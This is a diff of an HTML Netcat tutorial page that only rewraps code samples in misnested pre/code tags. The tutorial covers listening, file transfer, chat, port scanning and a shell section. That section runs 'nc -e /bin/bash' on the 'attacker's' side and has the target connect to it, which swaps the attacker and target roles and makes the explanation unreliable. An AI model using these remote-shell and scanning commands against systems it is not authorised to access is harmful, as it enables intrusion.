@@ -64,13 +64,13 @@
         Open your terminal and type:
     </p>
     <p>
-        <code>nc</code>
+        <pre><code>nc</pre></code>
     </p>
     <p>
         To view available options, use:
     </p>
     <p>
-        <code>nc -h</code>
+        <pre><code>nc -h</pre></code>
     </p>
 
     <h2>Basic Listening Mode</h2>
@@ -78,13 +78,13 @@
         To listen for incoming connections on a specified port:
     </p>
     <p>
-        <code>nc -l -p &lt;port&gt;</code>
+        <pre><code>nc -l -p &lt;port&gt;</pre></code>
     </p>
     <p>
         Example:
     </p>
     <p>
-        <code>nc -l -p 1234</code>
+        <pre><code>nc -l -p 1234</pre></code>
     </p>
 
     <h2>Connecting to a Remote Host</h2>
@@ -92,13 +92,13 @@
         To connect to a remote server on a specific port:
     </p>
     <p>
-        <code>nc &lt;target-ip&gt; &lt;port&gt;</code>
+        <pre><code>nc &lt;target-ip&gt; &lt;port&gt;</pre></code>
     </p>
     <p>
         Example:
     </p>
     <p>
-        <code>nc 192.168.1.10 1234</code>
+        <pre><code>nc 192.168.1.10 1234</pre></code>
     </p>
 
     <h2>Transferring Files</h2>
@@ -107,26 +107,26 @@
         On the sender's side, use:
     </p>
     <p>
-        <code>nc -l -p &lt;port&gt; &lt; &lt;file&gt;</code>
+        <pre><code>nc -l -p &lt;port&gt; &lt; &lt;file&gt;</pre></code>
     </p>
     <p>
         Example:
     </p>
     <p>
-        <code>nc -l -p 1234 &lt; myfile.txt</code>
+        <pre><code>nc -l -p 1234 &lt; myfile.txt</pre></code>
     </p>
     <p>
         <strong>Receiving a File:</strong><br>
         On the receiver's side, use:
     </p>
     <p>
-        <code>nc &lt;sender-ip&gt; &lt;port&gt; &gt; &lt;file&gt;</code>
+        <pre><code>nc &lt;sender-ip&gt; &lt;port&gt; &gt; &lt;file&gt;</pre></code>
     </p>
     <p>
         Example:
     </p>
     <p>
-        <code>nc 192.168.1.5 1234 &gt; receivedfile.txt</code>
+        <pre><code>nc 192.168.1.5 1234 &gt; receivedfile.txt</pre></code>
     </p>
 
     <h2>Chat Functionality</h2>
@@ -137,13 +137,13 @@
         On one terminal, listen for connections:
     </p>
     <p>
-        <code>nc -l -p &lt;port&gt;</code>
+        <pre><code>nc -l -p &lt;port&gt;</pre></code>
     </p>
     <p>
         On another terminal, connect to that port:
     </p>
     <p>
-        <code>nc &lt;target-ip&gt; &lt;port&gt;</code>
+        <pre><code>nc &lt;target-ip&gt; &lt;port&gt;</pre></code>
     </p>
     <p>
         Type messages and press Enter to send.
@@ -154,13 +154,13 @@
         Use Netcat to scan for open ports on a target:
     </p>
     <p>
-        <code>nc -z -v &lt;target-ip&gt; &lt;start-port&gt;-&lt;end-port&gt;</code>
+        <pre><code>nc -z -v &lt;target-ip&gt; &lt;start-port&gt;-&lt;end-port&gt;</pre></code>
     </p>
     <p>
         Example:
     </p>
     <p>
-        <code>nc -z -v 192.168.1.10 1-1000</code>
+        <pre><code>nc -z -v 192.168.1.10 1-1000</pre></code>
     </p>
 
     <h2>Using Netcat with Shell</h2>
@@ -171,13 +171,13 @@
         On the attacker’s machine, listen for a connection:
     </p>
     <p>
-        <code>nc -l -p &lt;port&gt; -e /bin/bash</code>
+        <pre><code>nc -l -p &lt;port&gt; -e /bin/bash</pre></code>
     </p>
     <p>
         On the target machine, connect back:
     </p>
     <p>
-        <code>nc &lt;attacker-ip&gt; &lt;port&gt;</code>
+        <pre><code>nc &lt;attacker-ip&gt; &lt;port&gt;</pre></code>
     </p>
 
     <h2>Using with Scripting</h2>
@@ -186,12 +186,12 @@
         Example of a simple script:
     </p>
     <p>
-        <code>
+        <pre><code>
         #!/bin/bash<br>
         nc -l -p 1234 | while read line; do<br>
         &nbsp;&nbsp;&nbsp;&nbsp;echo "Received: $line"<br>
         done
-        </code>
+        </pre></code>
     </p>
 
     <h2>Exiting Netcat</h2>
@@ -209,7 +209,7 @@
         Refer to the manual for more options and details:
     </p>
     <p>
-        <code>man nc</code>
+        <pre><code>man nc</pre></code>
     </p>
 
     <div class="container">
